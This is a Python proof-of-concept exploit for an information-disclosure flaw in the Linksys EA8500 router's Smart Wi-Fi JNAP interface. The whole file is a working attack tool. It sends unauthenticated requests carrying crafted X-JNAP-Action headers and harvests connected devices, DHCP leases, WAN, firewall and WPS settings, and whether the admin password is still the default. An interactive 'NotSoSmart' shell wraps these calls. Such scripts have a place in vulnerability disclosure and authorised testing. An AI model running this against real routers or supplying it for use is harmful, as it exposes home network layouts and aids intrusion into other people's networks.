#!/usr/bin/env python3
#
# Linksys EA8500
# Firmware Version: 1.1.5.178908
# Date: February 17th, 2017
#
# Linksys Smart Wi-fi X-JNAP-Action Sensitive Information Disclosure
# http://www.linksys.com/us/support-article?articleNum=156266

from pprint import pprint
import requests
from cmd import Cmd
import json

class notsosmartwifi():
	# fingerprinting methods
	methods = { 
		'GetOwnedNetworkID': 'http://linksys.com/jnap/ownednetwork/GetOwnedNetworkID',
		'IsAdminPasswordDefault': 'http://cisco.com/jnap/core/IsAdminPasswordDefault',
		'GetDevices': 'http://cisco.com/jnap/devicelist/GetDevices',
		'GetLANSettings': 'http://cisco.com/jnap/router/GetLANSettings',
		'GetWANStatus': 'http://cisco.com/jnap/router/GetWANStatus',
		'GetDHCPClientLeases': 'http://cisco.com/jnap/router/GetDHCPClientLeases',
		'GetNetworkConnections': 'http://cisco.com/jnap/networkconnections/GetNetworkConnections',
		'GetUPnPSettings': 'http://cisco.com/jnap/routerupnp/GetUPnPSettings',
		'GetManagementSettings': 'http://cisco.com/jnap/routermanagement/GetManagementSettings',
		'GetALGSettings': 'http://cisco.com/jnap/firewall/GetALGSettings',
		'GetTimeSettings': 'http://cisco.com/jnap/locale/GetTimeSettings',
		'GetRouterLEDSettings': 'http://cisco.com/jnap/routerleds/GetRouterLEDSettings',
		'GetFirmwareUpdateSettings': 'http://cisco.com/jnap/firmwareupdate/GetFirmwareUpdateSettings',
		'GetAdminPasswordRestrictions': 'http://cisco.com/jnap/core/GetAdminPasswordRestrictions',
		'GetDeviceInfo': 'http://cisco.com/jnap/core/GetDeviceInfo',
		'GetIPv6Settings': 'http://cisco.com/jnap/router/GetIPv6Settings',
		'GetRoutingSettings': 'http://cisco.com/jnap/router/GetRoutingSettings',
		'GetEthernetPortConnections': 'http://cisco.com/jnap/router/GetEthernetPortConnections',
		'GetParentalControlSettings': 'http://cisco.com/jnap/parentalcontrol/GetParentalControlSettings',
		'GetQoSSettings': 'http://cisco.com/jnap/qos/GetQoSSettings',
		'GetWLANQoSSettings': 'http://cisco.com/jnap/qos/GetWLANQoSSettings',
		'GetFirewallSettings': 'http://cisco.com/jnap/firewall/GetFirewallSettings',
		'GetSupportedDDNSProviders': 'http://cisco.com/jnap/ddns/GetSupportedDDNSProviders',
		'GetDDNSStatus': 'http://cisco.com/jnap/ddns/GetDDNSStatus',
		'GetGuestNetworkClients': 'http://cisco.com/jnap/guestnetwork/GetGuestNetworkClients',
		'GetMountedPartitions': 'http://cisco.com/jnap/storage/GetMountedPartitions',
		'GetWPSServerSettings': 'http://linksys.com/jnap/wirelessap/GetWPSServerSettings',
		'GetWANStatus3': 'http://linksys.com/jnap/router/GetWANStatus3'
		}

	def xmlhttprobe(self, target):
		r = {}
		for action,actionurl in self.methods.items():
			header = {'X-JNAP-Action': '{0}'.format(actionurl)}
			print('Grabbing data from {0}...'.format(action))
			r[action] = requests.post('http://{0}/JNAP/'.format(target), headers=header, data="{}").text
		return r

	def print_devices(self, target):
		r = {}
		header = {'X-JNAP-Action': '{0}'.format(self.methods['GetDevices'])}
		print('Grabbing data from {0}...'.format('GetDevices'))
		res = requests.post('http://{0}/JNAP/'.format(target), headers=header, data="{}").text

		rjson = json.loads(res)

		i=0
#		pprint(rjson)

		for entry in rjson['output']['devices']:
			print(entry)
			retval = {}

			if (len(entry['connections'])==0):
				hascxn = 0
			else:
				hascxn = 1

			if (hascxn):
				retval['ipAddress'] = entry['connections'][0]['ipAddress']
			else:
				retval['ipAddress'] = '<no ip given>'
			
			#retval['expiration'] = entry['expiration']

			if ('friendlyName' in entry):
				retval['ident'] = entry['friendlyName']
			else:
				if (hascxn):
					retval['ident'] = entry['connections'][0]['macAddress']
				else:
					retval['ident'] = entry['deviceID']

			if (entry['model']['deviceType'] != ''):
				retval['ident'] = retval['ident'] + " (" + entry['model']['deviceType'] + ")"

			i=i+1
			r[i]=retval

		r = dict(sorted(r.items(), key=lambda item: item[1]['ipAddress']))

		return r

	def print_leases(self, target):
		r = {}
		header = {'X-JNAP-Action': '{0}'.format(self.methods['GetDHCPClientLeases'])}
		print('Grabbing data from {0}...'.format('GetDHCPClientLeases'))
		res = requests.post('http://{0}/JNAP/'.format(target), headers=header, data="{}").text

		rjson = json.loads(res)

		i=0
		for entry in rjson['output']['leases']:
			retval = {}
			retval['ipAddress'] = entry['ipAddress']
			retval['expiration'] = entry['expiration']
			if ('hostName' in entry):
				retval['ident'] = entry['hostName']
			else:
				retval['ident'] = entry['macAddress']
			i=i+1
			r[i]=retval

		r = dict(sorted(r.items(), key=lambda item: item[1]['expiration'], reverse=True))

		return r

class ui(Cmd):
	red = '\033[31m'
	green = '\033[32m'
	bold = '\033[1m'
	end = '\033[0m'
	nss = notsosmartwifi()
	prompt = '{0}{1}NotSoSmart> {2}'.format(bold,green,end)
	intro = """
                  
		 ███▄    █   ██████   ██████ 
		 ██ ▀█   █ ▒██    ▒ ▒██    ▒ 
		▓██  ▀█ ██▒░ ▓██▄   ░ ▓██▄   
		▓██▒  ▐▌██▒  ▒   ██▒  ▒   ██▒
		▒██░   ▓██░▒██████▒▒▒██████▒▒
		░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░
		░ ░░   ░ ▒░░ ░▒  ░ ░░ ░▒  ░ ░
		   ░   ░ ░ ░  ░  ░  ░  ░  ░  
		         ░       ░      
		     (not so) smartwifi
		   {0}usage{1}: probe <router ip>
		   {0}usage{1}: probe 192.168.1.1

	      tested on firmware v. 1.1.5.178908

		                  
	""".format(bold, end)

	def do_probe(self, target):
		print("\n")
		results = self.nss.xmlhttprobe(target)
		for result,v in results.items():
			print(self.bold,self.green,result,self.end)
			pprint(v)
			print("\n\n")

	def do_leases(self,target):
		results = self.nss.print_leases(target)
		for result,v in results.items():
			print(self.bold,self.green,v['ipAddress']+" ["+v['ident']+"]",self.end)

	def do_devices(self,target):
		results = self.nss.print_devices(target)
		for result,v in results.items():
			print(self.bold,self.green,v['ipAddress']+" ["+v['ident']+"]",self.end)

	def do_exit(self, void):
		return True


if __name__ == "__main__":
	ui = ui()
	ui.cmdloop()
